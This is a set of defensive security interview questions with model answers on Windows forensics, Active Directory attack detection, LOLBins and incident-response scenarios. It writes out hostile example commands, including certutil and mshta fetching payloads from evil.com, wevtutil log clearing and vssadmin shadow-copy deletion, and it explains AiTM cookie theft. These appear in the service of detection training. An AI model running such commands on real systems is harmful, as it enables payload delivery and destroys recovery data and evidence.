### Q1. How do you distinguish between a SOC Analyst role and a Blue Team / Defensive Engineer role?

**What the Interviewer is Evaluating:** Whether you understand operational alert processing versus architectural and proactive engineering.

**Comprehensive Answer:**
> "In an enterprise, the **SOC** is fundamentally an operational, SLA-driven function focused on real-time triage, validation, and immediate containment of incoming alerts generated by our telemetry pipeline. Their primary KPIs are Mean Time to Acknowledge (MTTA), Mean Time to Remediate (MTTR), and queue SLA adherence.
>
> In contrast, the **Blue Team / Defensive Engineering** group is an engineering and investigative body. Rather than just processing alerts, we:
> 1. **Build the Detections:** We author, test, and deploy detection logic using Detection-as-Code (DaC) with Sigma, YARA, Splunk SPL, and Sentinel KQL.
> 2. **Conduct Deep Forensics (DFIR):** When an incident escalates beyond standard tier triage, we extract volatile memory, parse file system journals ($MFT/$UsnJrnl), and reverse engineer malicious binaries to establish true root cause.
> 3. **Proactively Hunt:** We do not wait for an alert; we hypothesize adversary presence and perform data stacking to uncover dwell time.
> 4. **Harden the Environment:** We engineer Attack Surface Reduction (ASR) rules, Windows Defender Application Control (WDAC), and Tiered Active Directory administration models so attacks fail at execution time."

### Q2. Explain the Order of Volatility (RFC 3227) and walk me through live response triage on a Windows server.

**What the Interviewer is Evaluating:** Forensic rigor, preservation of evidence, understanding that pulling the plug is an archaic practice.

**Comprehensive Answer:**
> "Under **RFC 3227**, evidence must be gathered from the most volatile to the least volatile state because ephemeral data is lost upon reboot, network disconnection, or process termination:
>
> 1. **Registers and CPU Cache** (Lost immediately).
> 2. **Physical Memory (RAM):** Running processes, unencrypted C2 keys, network connections, injected DLLs, uncommitted credentials.
> 3. **Network State & Kernel Statistics:** ARP cache, active routing tables, listening sockets, established TCP/UDP sessions.
> 4. **Temporary Filesystem & Running State:** Swap space, pagefile.sys, `/tmp` or `C:\Users\AppData\Local\Temp`.
> 5. **Non-Volatile Storage (Disk):** NTFS metadata ($MFT, $LogFile), event logs, registry hives.
> 6. **Remote Logs & Backups:** SIEM logs, firewall flows, cold backups.

```
                  LIVE TRIAGE ACQUISITION FLOW
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│ 1. MEMORY FIRST │ ──► │ 2. LIVE TELEMETRY│ ──► │ 3. TARGETED DISK│
│ WinPmem / DumpIt│     │ Netstat, ARP, PS │     │ KAPE Triage /   │
│ Captures raw RAM│     │ via LiveResponse │     │ Zimmerman Tools │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

> **Live Triage Sequence on a Windows Host:**
> - **Step 1: Never pull the plug** if BitLocker is enabled, as doing so seals the Volume Master Key in RAM.
> - **Step 2: Collect RAM first** using an out-of-band external drive running `WinPmem` or via EDR Live Response (e.g., CrowdStrike Falcon `memdump` or Velociraptor).
> - **Step 3: Capture Volatile Volatilities:** Execute `netstat -ano`, `arp -a`, `ipconfig /displaydns`, and `query user`.
> - **Step 4: Execute Targeted Artifact Triage:** Run **KAPE** with the `KapeTriage` target to grab Prefetch, $MFT, Registry Hives, Event Logs, and Amcache within 3–5 minutes without imaging a 2 TB disk.
> - **Step 5: Cryptographic Hashing:** Generate SHA-256 hashes of all acquired images to maintain the Chain of Custody."

### Q3. What is the difference between `$STANDARD_INFORMATION` and `$FILE_NAME` in the NTFS Master File Table ($MFT), and how do you detect timestomping?

**What the Interviewer is Evaluating:** Low-level filesystem knowledge and ability to expose anti-forensics.

**Comprehensive Answer:**
> "In NTFS, every file and directory has a 1024-byte record inside the `$MFT`. Each record contains two critical timestamp attributes recording MACB (Modified, Accessed, Changed MFT, Born/Created):
>
> 1. **`$STANDARD_INFORMATION` ($SIA / Attribute 0x10):**
>    - Holds standard file properties (read-only, hidden) and timestamps.
>    - **Vulnerability:** Exposed to user-mode APIs (such as `SetFileTime` in the Win32 API). Any adversary running tools like `timestomp` or PowerShell can arbitrarily rewrite these timestamps to blend into `C:\Windows\System32`.
> 2. **`$FILE_NAME` ($FNA / Attribute 0x30):**
>    - Holds the file name, namespace, parent directory reference, and another set of MACB timestamps.
>    - **Security:** Modified **only by the Windows NTFS kernel driver**. There is no standard user-mode Win32 API that allows an attacker to rewrite `$FILE_NAME` timestamps directly without writing a custom kernel driver or directly editing raw disk sectors.

```
                        TIMESTOMP DETECTION LOGIC
┌──────────────────────────────────────┐  ┌──────────────────────────────────────┐
│  $STANDARD_INFORMATION (User Mode)   │  │       $FILE_NAME (Kernel Only)       │
├──────────────────────────────────────┤  ├──────────────────────────────────────┤
│ Created:  2021-04-12 10:15:00 (FAKE!)│  │ Created:  2026-03-01 02:14:22 (REAL!)│
└──────────────────────────────────────┘  └──────────────────────────────────────┘
                   ▲                                         ▲
                   └────────────── DISCREPANCY ──────────────┘
                         Formula: $SIA.Created < $FNA.Created
```

> **Detection Methodology:**
> - When we parse `$MFT` using Eric Zimmerman’s `MFTECmd` or `AnalyzeMFT`, we compare the two timestamp sets.
> - **The Rule:** If `$STANDARD_INFORMATION.Created` is **earlier** than `$FILE_NAME.Created`, or if `$SIA` has fractional seconds rounded to zero (`.0000000Z`—a hallmark of sloppy timestomp scripts), **timestomping is definitively proven**."

### Q4. Walk me through the core Windows execution artifacts: Prefetch, ShimCache, Amcache, BAM, and UserAssist. What unique value does each provide?

**What the Interviewer is Evaluating:** Can you definitively prove a binary ran versus merely existed on disk?

**Comprehensive Answer:**

| Artifact | Location | What It Proves | Retention / Caveats |
|---|---|---|---|
| **Prefetch (`.pf`)** | `C:\Windows\Prefetch\` | **Definitive Execution:** Run count, first execution, last 8 execution timestamps (Win 10/11), and all files/DLLs loaded in the first 10 seconds. | Disabled by default on Windows Server; enabled on Workstations. Max 1024 files. |
| **ShimCache** (AppCompatCache) | `SYSTEM` Registry Hive | **Proof of Existence & Potential Execution:** File path, file size, last modified time, and an execution flag. | Written from memory to disk **only upon system reboot or clean shutdown**. |
| **Amcache.hve** | `C:\Windows\appcompat\Programs\Amcache.hve` | **Cryptographic Hash Evidence:** Stores SHA-1 hash of the binary, compile timestamp, and full file path. | Retains the hash **even after the malware executable has been deleted from disk**. |
| **BAM / DAM** | `SYSTEM` Registry Hive | **User Execution:** Records the exact timestamp (down to the second) when a specific user profile executed an application. | Introduced in Windows 10 Fall Creators Update. Tied to User SID. |
| **UserAssist** | `NTUSER.DAT` Registry Hive | **GUI Execution:** Tracks applications launched via Windows Explorer (double-clicked by user), run counts, and last launch time. | Encrypted via ROT13. Does not record CLI/PowerShell executions. |

> **Investigative Synthesis:**
> *"If an attacker executes `evil.exe` via cmd.exe, deletes it, and reboots:
> - **Prefetch** proves it ran and shows what DLLs it touched.
> - **Amcache** gives me the SHA-1 hash to search across VirusTotal and the rest of our fleet.
> - **ShimCache** confirms the path and metadata prior to shutdown.
> - **BAM** tells me which specific employee account executed it."*

### Q5. How does memory analysis using Volatility 3 detect process injection techniques like Process Hollowing and DLL Injection?

**What the Interviewer is Evaluating:** Deep memory forensics proficiency and understanding of Virtual Address Descriptors (VAD).

**Comprehensive Answer:**
> "Process injection hides malicious code inside the memory space of a legitimate, trusted process (e.g., `explorer.exe`, `svchost.exe`, `spoolsv.exe`). In Volatility 3, we detect this by examining process memory structures and page protection permissions:
>
> 1. **Understanding `windows.malfind`:**
>    - `malfind` walks through each process's Virtual Address Descriptor (VAD) tree looking for memory allocations that violate standard security architecture.
>    - It alerts on memory regions marked with **`PAGE_EXECUTE_READWRITE` (RWX)**. Legitimate software rarely uses RWX due to Data Execution Prevention (DEP/W^X); legitimate programs allocate memory as Read/Write, write data, and then transition to Execute/Read.
>    - It inspects whether the executable memory allocation is **unbacked by a file on disk**. Legitimate DLLs and binaries map to an actual file image (`VadImageMap`). Injected code (e.g., reflective DLLs or shellcode) is allocated dynamically as private memory (`VadS`).

```
                    PROCESS HOLLOWING MEMORY SIGNATURE
Legitimate Process: svchost.exe (PID: 1240)
├── VAD Node 0x00400000 [VadImageMap] -> C:\Windows\System32\svchost.exe (PAGE_EXECUTE_READ)
└── VAD Node 0x02AB0000 [VadS - Private] -> NO FILE BACKING (PAGE_EXECUTE_READWRITE)
    └── Hex Dump: 4D 5A 90 00 ... ("MZ" Header injected in raw memory!)
```

> 2. **Process Hollowing Detection:**
>    - The adversary spawns a legitimate binary in a suspended state (`CREATE_SUSPENDED`), unmaps the original executable code using `NtUnmapViewOfSection`, and writes malicious PE content using `WriteProcessMemory`.
>    - **Detection:** We run `windows.ldrmodules`. If a module appears in the PEB (Process Environment Block) lists (InLoadOrder, InMemoryOrder, InInitializationOrder) but `windows.vadinfo` shows base memory addresses mismatched or lacking file backing, the process is hollowed.
> 3. **Volatility 3 Commands:**
>    ```bash
>    # 1. Identify suspicious memory allocations
>    vol -f mem.raw windows.malfind
>    # 2. Correlate loaded modules with PEB
>    vol -f mem.raw windows.ldrmodules --pid <PID>
>    # 3. Dump the injected memory region for static analysis
>    vol -f mem.raw -o ./dumps windows.malfind --dump --pid <PID>
>    ```

### Q6. What is Detection-as-Code (DaC), and how does an enterprise build a modern detection pipeline?

**What the Interviewer is Evaluating:** Engineering maturity. Can you treat detections as software rather than one-off GUI configurations?

**Comprehensive Answer:**
> "**Detection-as-Code (DaC)** applies modern software engineering principles—version control, continuous integration, automated testing, code review, and automated deployment—to the creation and lifecycle management of detection logic.
>
> **The Enterprise Pipeline:**
> 1. **Rule Authoring in Git:** Detection engineers write rules in open, vendor-neutral formats like **Sigma** (for log telemetry) or **YARA** (for files and memory). Every rule contains rich metadata: MITRE ATT&CK technique IDs, severity, false-positive baselines, and test criteria.
> 2. **Pull Request & Peer Review:** No detection is pushed directly to production. A peer reviews the rule for query performance, regex efficiency, and potential false positives.
> 3. **CI/CD Validation (GitHub Actions / GitLab CI):**
>    - **Linting:** Schema validation ensures mandatory fields exist.
>    - **Unit Testing:** The pipeline compiles the Sigma rule into SIEM-specific syntax (Splunk SPL, Sentinel KQL) using `pySigma`.
>    - **Replay Testing:** The rule is executed against pre-recorded synthetic attack telemetry (from atomic tests) to verify it generates an alert, and against a 30-day baseline log cache to verify it does not trigger an alert storm.
> 4. **Automated Deployment:** Once merged into the `main` branch, an automated CD pipeline uses REST APIs to deploy the rule into production SIEMs, EDRs, and data lakes.
> 5. **Continuous Verification:** Scheduled adversary emulation tools (e.g., Atomic Red Team) run weekly in a staging environment to ensure the detection continues to fire as log formats update."

### Q7. Explain Kerberoasting and AS-REP Roasting from a DEFENDER's perspective. How do you detect and mitigate both?

**What the Interviewer is Evaluating:** Whether you understand Active Directory security mechanics from the defensive side rather than just running Impacket tools.

**Comprehensive Answer:**

```
                        KERBEROS DEFENSIVE TELEMETRY
┌──────────────────────────────────────┐  ┌──────────────────────────────────────┐
│           KERBEROASTING              │  │           AS-REP ROASTING            │
├──────────────────────────────────────┤  ├──────────────────────────────────────┤
│ Event ID: 4769 (TGS Request)         │  │ Event ID: 4768 (TGT Request)         │
│ Encryption Type: 0x17 (RC4-HMAC)     │  │ Pre-Authentication: 0 (Disabled)    │
│ Target: Service Accounts with SPNs   │  │ Target: Users with "Do not require   │
│ Alert: Spike in RC4 TGS requests     │  │         Kerberos pre-authentication" │
└──────────────────────────────────────┘  └──────────────────────────────────────┘
```

> **1. Kerberoasting Defense:**
> - **Mechanics:** Any authenticated domain user requests a Kerberos Ticket Granting Service (TGS) ticket for an account with a Service Principal Name (SPN). The ticket is encrypted with the service account's NTLM hash. The attacker dumps and cracks it offline.
> - **Detection:**
>   - Monitor **Event ID 4769** (A Kerberos service ticket was requested).
>   - Filter for `Ticket_Options` and look for `Ticket_Encryption_Type: 0x17` (RC4-HMAC). Modern Windows environments default to AES256 (`0x12` or `0x13`). A request for RC4 indicates an adversary requesting weak encryption to accelerate offline Hashcat cracking.
>   - Baseline volume: Alert when a single user account requests dozens of TGS tickets across disparate services within minutes.
> - **Mitigation:**
>   - Enforce Group Managed Service Accounts (**gMSA**)—passwords are 120 characters, randomly generated, and rotated automatically by AD every 30 days.
>   - For legacy service accounts, enforce 25+ character complex passwords to make offline cracking mathematically infeasible.
>   - Deploy **Honey-SPNs**: Create a fake service account (`MSSQLSvc_Honey`) with an SPN that is never used legitimately. Any 4769 request for this SPN triggers an immediate Priority 1 alert.
>
> **2. AS-REP Roasting Defense:**
> - **Mechanics:** Targets user accounts with the attribute `DONT_REQ_PREAUTH` enabled. An unauthenticated attacker requests an AS-REP ticket, which includes a blob encrypted with the user's password hash.
> - **Detection:**
>   - Monitor **Event ID 4768** (Kerberos TGT requested) where `Pre-Authentication Type` is `0` (Logon without Pre-Authentication).
> - **Mitigation:**
>   - Run an audit script to eliminate the misconfiguration:
>     ```powershell
>     Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select-Object SamAccountName
>     ```
>   - Uncheck "Do not require Kerberos pre-authentication" across all user accounts."

### Q8. How do you detect and hunt for Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) lateral movement in an Active Directory environment?

**What the Interviewer is Evaluating:** Advanced understanding of Windows authentication logs and lateral movement mechanics.

**Comprehensive Answer:**
> "**Pass-the-Hash (PtH) Detection:**
> - **Mechanism:** The attacker uses stolen NTLM hashes to authenticate over SMB/RPC without needing the plaintext password.
> - **Event Log Signature:**
>   - **Event ID 4624 (Successful Logon):** Look for **Logon Type 3** (Network logon) or **Logon Type 9** (NewCredentials—used by Mimikatz `sekurlsa::pth` to impersonate locally while authenticating over the network).
>   - Crucial Field: `Logon_Process_Name` is **`NtLmSsp`**, and `Authentication_Package` is **`NTLM`**, with `Key_Length: 0`.
>   - In a modern domain where Kerberos is the default protocol, sudden bursts of NTLM Type 3 logons between internal workstations (workstation-to-workstation) are a primary indicator of lateral movement.
> - **Mitigation:** Enable **Restricted Admin Mode** for RDP, add privileged accounts to the **Protected Users** security group (which disables NTLM caching and delegation), and implement **LAPS**.
>
> **Pass-the-Ticket (PtT) Detection:**
> - **Mechanism:** The attacker extracts a Kerberos Ticket Granting Ticket (TGT) from LSASS memory on one machine and injects it into their own session on another.
> - **Event Log Signature:**
>   - **Event ID 4624:** Logon Type 3 using Kerberos.
>   - **Discrepancy Hunt:** Correlate **Event ID 4768** (TGT Issued on Domain Controller) with **Event ID 4624** (Host Logon). In a PtT scenario, you will see a service ticket requested or a host accessed using a TGT, but **no corresponding Event ID 4768 ever originated from that client's IP address** on the DC.
>   - **Golden Ticket Signatures:** Look for Event ID 4769 with tickets requesting non-expiring lifetimes (e.g., 10 years, when Microsoft default maximum is 10 hours) and domain account SIDs with abnormal RID allocations."

### Q9. What are Living-off-the-Land Binaries (LOLBins), and how do you detect their abuse?

**What the Interviewer is Evaluating:** Practical understanding of defense evasion; recognizing that modern attackers use native Microsoft utilities rather than custom malware.

**Comprehensive Answer:**
> "**LOLBins (Living-off-the-Land Binaries)** are legitimate, signed binaries pre-installed on the operating system (e.g., `certutil.exe`, `mshta.exe`, `rundll32.exe`, `wmic.exe`, `bitsadmin.exe`) that attackers repurpose to download payloads, bypass AppLocker/WDAC, execute code, or evade antivirus.
>
> **Top LOLBins & Their Detection Telemetry:**
>
> 1. **`certutil.exe` (Certificate Utility):**
>    - *Abuse:* Used as an arbitrary file downloader or Base64 decoder (`certutil -urlcache -split -f http://evil.com/payload.bin`).
>    - *Detection:* Process creation (Sysmon Event ID 1 / Security 4688) where `CommandLine` contains `-urlcache`, `-split`, or `-decode`. Legitimate use of certutil to fetch HTTP URLs from the command line is virtually zero in corporate environments.
>
> 2. **`mshta.exe` (Microsoft HTML Application Host):**
>    - *Abuse:* Executes remote HTA, VBScript, or JScript payloads directly from the web, bypassing browser execution boundaries (`mshta http://evil.com/file.hta` or `mshta vbscript:Execute(...)`).
>    - *Detection:* Any execution of `mshta.exe` making outbound network connections (Sysmon Event ID 3) or spawning child processes like `cmd.exe` or `powershell.exe`.
>
> 3. **`rundll32.exe`:**
>    - *Abuse:* Executes malicious exports inside arbitrary DLLs, or executes inline JavaScript (`rundll32.exe javascript:...`).
>    - *Detection:* Monitor for `rundll32.exe` spawned with an empty command line, executing from user-writable directories (`C:\Users\AppData\*`), or without any command-line parameters.
>
> 4. **Defensive Architecture:**
>    - Deploy Microsoft's recommended **Attack Surface Reduction (ASR)** rules.
>    - Enforce the **LOLBAS Blacklist** via Windows Defender Application Control (WDAC) policies to block the execution of known dual-use binaries by non-administrative users."

### Q10. How do you investigate an adversary who has cleared the Windows Event Logs?

**What the Interviewer is Evaluating:** Knowing how to recover and uncover evidence when the primary logging layer has been intentionally wiped.

**Comprehensive Answer:**
> "When an attacker clears event logs (e.g., via `wevtutil cl Security` or `Clear-EventLog`), they create a high-fidelity alert in itself:
>
> 1. **Immediate Detection:**
>    - **Security Log:** Generates **Event ID 1102** ('The audit log was cleared'). This event records the Subject User SID, Username, and Domain of the identity that issued the clear command.
>    - **System Log:** Generates **Event ID 104** ('The log file was cleared').
>
> 2. **Reconstructing Activity Despite Cleared Logs:**
>    - **The USN Journal (`$UsnJrnl`):** The NTFS Update Sequence Number Journal tracks every file creation, modification, and deletion. Even if `Security.evtx` was wiped, the USN Journal records the physical deletion and modification transactions, proving the exact second the file was cleared.
>    - **Volume Shadow Copies (VSS):** If shadow copies were not deleted, mount a previous snapshot using `vssadmin` or `mklink` and extract the historical `.evtx` files intact:
>      ```powershell
>      vssadmin list shadows
>      mklink /d C:\ShadowVolume \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
>      copy C:\ShadowVolume\Windows\System32\Winevt\Logs\Security.evtx C:\Recovery\
>      ```
>    - **Execution Artifacts (Prefetch & Amcache):** `PECmd` parsing of `WEVTUTIL.EXE-*.pf` will reveal execution timestamps, run count, and referenced system files.
>    - **Central SIEM / WEF Ingestion:** In a mature enterprise with real-time log forwarding, event logs are streamed to Splunk or Microsoft Sentinel within milliseconds. The event logs are preserved in the central data lake even if destroyed on the endpoint."

### Q14. SCENARIO: At 2:00 AM on a Saturday, an EDR alert fires indicating that `vssadmin.exe delete shadows /all /quiet` was executed on an internal file server. Walk me through your first 30 minutes.

**What the Interviewer is Evaluating:** Crisis triage, execution discipline, avoiding panic, and executing containment with speed.

```
                  2:00 AM INCIDENT RESPONSE FLOW
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│ 00 - 05 MINS    │ ──► │ 05 - 15 MINS     │ ──► │ 15 - 30 MINS    │
│ Triage & Isolate│     │ Scope Blast      │     │ Preserve RAM &  │
│ Network Contain │     │ Identify Patient │     │ Protect Backups │
│ via EDR API     │     │ Zero via SIEM    │     │ Disconnect cold │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

**Comprehensive Walkthrough:**

> **Minutes 00 – 05: Validation & Immediate Containment**
> - The execution of `vssadmin delete shadows /all /quiet` is a signature of **impending or active ransomware encryption** designed to prevent local recovery. This is an immediate Priority 1 incident.
> - **Action:** Instantly trigger **EDR Network Isolation / Containment** on that file server via the CrowdStrike/Defender console. This blocks all east-west and north-south network communication while maintaining the EDR management channel for live response.
>
> **Minutes 05 – 15: Scoping the Blast Radius**
> - Open SIEM/EDR: Inspect the process tree of `vssadmin.exe`.
>   - What was the **parent process**? Was it `cmd.exe`, `powershell.exe`, or a service like `psexecsvc.exe`?
>   - What was the **user account** context? Was it a compromised Domain Admin or a local system account?
> - Sweep the fleet: Run an immediate query across all endpoints:
>   ```spl
>   index=edr (Image="*\\vssadmin.exe" AND CommandLine="*delete*shadows*") OR (CommandLine="*wbadmin*delete*catalog*")
>   ```
> - Identify how many other endpoints are exhibiting this behavior.
>
> **Minutes 15 – 25: Protecting the Critical Control Plane**
> - Contact the on-call Infrastructure/Storage Lead: Ensure that **immutable and offline/air-gapped backup repositories** are immediately disconnected or placed in read-only lock. If attackers have reached the stage of deleting shadow copies, they will attempt to target network-attached backup appliances next.
> - If a Domain Admin credential was used, initiate an immediate emergency password reset and session revocation for that account.
>
> **Minutes 25 – 30: Forensic Preservation & Escalation**
> - Initiate volatile memory collection (`.raw` dump) on the isolated file server via EDR live response before any potential ransomware payload completes execution.
> - Formally initiate the Incident Response War Room; escalate to the CISO, Head of Infrastructure, and Legal Counsel under our corporate IR escalation charter."

### Q15. SCENARIO: An executive's Microsoft 365 account triggers an "Impossible Travel" alert. You suspect an Adversary-in-the-Middle (AiTM) phishing attack bypassed FIDO2/MFA. How do you investigate and contain?

**What the Interviewer is Evaluating:** Modern cloud identity forensics, understanding session token theft (Evilginx2 style), and knowing that password resets alone do not remediate token theft.

```
                    AiTM SESSION TOKEN HIJACKING
Victim ──► [Phishing Reverse Proxy (Evilginx2)] ──► [Legitimate Microsoft Login]
User enters creds + MFA ──► Proxy captures ESTSAuth session cookie ──► Attacker injects
                                                                       cookie into browser!
```

**Comprehensive Walkthrough:**

> **1. Understanding the Attack Mechanics:**
> - In an **Adversary-in-the-Middle (AiTM)** attack, the victim is lured to a reverse proxy that proxies the legitimate Microsoft 365 authentication flow in real-time.
> - Once the executive enters their credentials and approves the MFA prompt, the proxy intercepts the authenticated HTTP session cookies—specifically the **`ESTSAuth`** and **`ESTSAuthPersistent`** cookies—and session refresh tokens.
> - The attacker injects these cookies into their own browser. **They are now authenticated without ever needing to know the executive's password or trigger another MFA prompt.**
>
> **2. Forensic Investigation in Microsoft Entra ID:**
> - Pull **Entra ID Sign-in Logs** (both Non-Interactive and Interactive):
>   - Filter for the executive's User Principal Name (UPN) over the last 24 hours.
>   - Correlate the **Sign-in Status**, **IP Address**, **Location**, and **User Agent**.
>   - Look for the initial sign-in: It will show **MFA requirement satisfied in the token** from the attacker's IP, because the legitimate user fulfilled the MFA challenge via the proxy.
>   - Inspect the **Correlation ID** and **Session ID**. Look for rapid downstream access to Exchange Online, OneDrive, or Azure Portal from an IP registered to a foreign hosting provider (e.g., DigitalOcean, AWS, Linode).
> - Audit **Exchange Online Mailbox Audit Logs**:
>   - Check for newly created **Inbox Rules** (often named '.', 'Invoice', or blank) designed to forward emails or immediately move emails containing keywords (`wire`, `payment`, `confidential`) to the RSS Feeds or Deleted Items folder:
>     ```powershell
>     Get-InboxRule -Mailbox executive@corp.com
>     Search-UnifiedAuditLog -Operations "New-InboxRule","Set-Mailbox" -FreeText "ForwardTo"
>     ```
>
> **3. Surgical Containment (Password Reset is NOT enough!):**
> - If you only reset the password, the attacker's session token remains valid until expiration (up to 24 hours).
> - **Action 1: Revoke all refresh tokens immediately:**
>   ```powershell
>   Revoke-AzureADUserAllRefreshToken -ObjectId "<User-GUID>"
>   # Or via Microsoft Graph PowerShell:
>   Revoke-MgUserSignInSession -UserId "<User-GUID>"
>   ```
> - **Action 2:** Force a password reset.
> - **Action 3:** Check and delete any newly registered MFA devices or OAuth Enterprise Applications authorized during the session.
> - **Action 4:** Remove any malicious inbox forwarding rules."

### Q16. SCENARIO: An EDR alert flags suspicious injection into `explorer.exe`, but when you inspect the disk, the associated executable has been deleted. How do you recover the binary or prove execution?

**What the Interviewer is Evaluating:** Forensics beyond static files; carving deleted artifacts from memory and disk journals.

**Comprehensive Answer:**
> "When an adversary deletes their dropper or payload post-execution, they leave behind multiple high-integrity forensic traces across memory and disk:
>
> 1. **Extracting the Binary from Volatile Memory:**
>    - Because the binary was injected or executed, its executable image or memory section often remains active in RAM.
>    - Using Volatility 3:
>      ```bash
>      # Identify the target injection address in explorer.exe
>      vol -f memory.raw windows.malfind --pid <explorer_PID>
>      # Dump the mapped executable section directly to disk
>      vol -f memory.raw -o ./recovered_payload windows.dumpfiles --pid <explorer_PID>
>      ```
>
> 2. **Recovering Cryptographic Hashes from `Amcache.hve`:**
>    - The Windows Application Compatibility Cache (`Amcache.hve`) records metadata for recently executed binaries.
>    - Even if `malware.exe` was deleted seconds after execution, parsing `Amcache.hve` using Eric Zimmerman's `AmcacheParser` will extract the **SHA-1 hash**, compile time, and original file path.
>
> 3. **Carving from the Master File Table ($MFT) and Volume Shadow Copies:**
>    - If the file was small (< 700 bytes), it was stored as **resident data** inside the MFT record itself. Parsing the `$MFT` with `MFTECmd` can recover the entire file content directly from the record.
>    - If non-resident, the file clusters on disk are marked as unallocated space. As long as those clusters have not been overwritten, tools like **FTK Imager** or `PhotoRec` can carve the raw PE binary out of unallocated space.
>
> 4. **Proving Execution via Prefetch:**
>    - Check `C:\Windows\Prefetch\`. If `EVIL.EXE-*.pf` exists, parsing it with `PECmd` provides the execution timestamp, run count, and a list of all DLLs and files touched during execution."

### Q17. SCENARIO: How do you design and execute a proactive threat hunt for "Unsigned DLL Sideloading in User-Writable Directories"?

**What the Interviewer is Evaluating:** Structured threat hunting methodology, hypothesis generation, data query proficiency, and false-positive reduction.

**Comprehensive Answer:**
> "**Phase 1: Hypothesis Formulation**
> Adversaries bypass application whitelisting and evade EDR detections by dropping a legitimate, digitally signed Microsoft executable into a user-writable directory (`C:\Users\*\AppData\` or `C:\Windows\Temp\`) alongside a malicious, unsigned DLL that shares the same name as a legitimate dependency, tricking the executable into loading the malicious DLL.
>
> **Phase 2: Required Telemetry Sources**
> - Sysmon **Event ID 7** (Image loaded / DLL loading).
> - EDR Module Load telemetry (e.g., CrowdStrike `ImageLoad` or Defender `DeviceImageLoadEvents`).
>
> **Phase 3: The Threat Hunt Query (Microsoft Sentinel KQL)**
> ```kql
> DeviceImageLoadEvents
> | where FolderPath has_any (@"C:\Users\", @"C:\ProgramData\", @"C:\Windows\Temp\", @"C:\Temp\")
> | where IsSigned == false or SignatureStatus != "Valid"
> // Filter out legitimate development environments if needed
> | project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath, FileName, FolderPath, SHA256
> | summarize LoadCount = count(), Hosts = makeset(DeviceName) by InitiatingProcessFileName, FileName, FolderPath
> | sort by LoadCount asc
> ```
>
> **Phase 4: Long-Tail Stacking & Analysis**
> - Standard software executes thousands of times across the enterprise. The hunt focuses on the **long tail**—instances where an unsigned DLL was loaded **1 or 2 times across the entire fleet of 30,000 workstations**.
> - Inspect the parent binary: If `calc.exe` or `OneDriveStandaloneUpdater.exe` is loading an unsigned DLL from a user's `Downloads` folder, this is an immediate indicator of DLL Sideloading.
>
> **Phase 5: Resolution & Feedback Loop**
> - If verified as an attack, isolate the host and initiate DFIR.
> - If identified as an operational gap, convert the hunt query into a permanent **Sigma rule** deployed to the SIEM, and recommend an AppLocker/WDAC policy restricting execution from user-writable directories."
